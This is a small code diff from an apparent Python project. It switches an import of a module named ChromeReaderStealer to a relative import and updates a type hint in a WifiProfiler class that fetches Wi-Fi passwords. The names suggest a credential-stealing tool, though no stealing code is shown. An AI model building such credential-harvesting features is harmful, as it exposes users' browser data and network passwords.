@@ -19,7 +19,7 @@ import cv2
 #import random
 import re
 import webbrowser
-import ChromeReaderStealer
+from . import ChromeReaderStealer
 import tempfile
 import shutil
 import uuid
@@ -295,7 +295,7 @@ class WifiProfiler:
             self.get()
             self.get_password()
             self.security = 'WPA'
-            self.qr_code: PIL.Image = None
+            self.qr_code: Image.Image | None = None
             self.get_qr_code()
 
         def get(self):
